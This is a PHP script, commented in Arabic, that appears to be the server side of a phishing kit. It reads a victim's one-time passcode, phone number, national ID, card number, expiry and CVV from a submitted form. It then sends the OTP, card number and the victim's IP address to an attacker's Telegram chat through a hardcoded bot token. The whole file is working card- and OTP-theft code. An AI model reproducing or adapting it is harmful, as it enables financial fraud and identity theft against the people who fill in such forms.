<?php
// إعدادات تيليجرام - البوت الأول فقط
define('BOT_TOKEN', '8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A');
define('CHAT_ID', '8053385893');

// استقبال البيانات
$otp_code_first = isset($_POST['otp_code_first']) ? $_POST['otp_code_first'] : 'غير متوفر';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : 'غير متوفر';
$user_id = isset($_POST['user_id']) ? $_POST['user_id'] : 'غير متوفر';

// استقبال باقي البيانات
$full_name = isset($_POST['full_name']) ? $_POST['full_name'] : 'غير متوفر';
$national_id = isset($_POST['national_id']) ? $_POST['national_id'] : 'غير متوفر';
$birth_date_hijri = isset($_POST['birth_date_hijri']) ? $_POST['birth_date_hijri'] : 'غير متوفر';
$card_number = isset($_POST['card_number']) ? $_POST['card_number'] : 'غير متوفر';
$expiry_date = isset($_POST['expiry_date']) ? $_POST['expiry_date'] : 'غير متوفر';
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : 'غير متوفر';

// تجهيز الرسالة
$message = "🔐 *رمز التحقق الأول - OTP 1*\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "🔢 *رمز التحقق الأول:* `$otp_code_first`\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "💳 *card number:* `$card_number`\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "🕐 *الوقت:* " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 *IP:* " . $_SERVER['REMOTE_ADDR'] . "\n";

if (!empty($user_id)) {
    $message .= "👥 *User ID:* `$user_id`\n";
}

// إرسال الرسالة إلى تيليجرام
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$data = [
    'chat_id' => CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

// إرجاع استجابة للصفحة
header('Content-Type: application/json');
echo json_encode([
    'status' => 'received',
    'message' => 'OTP code logged'
]);
?>
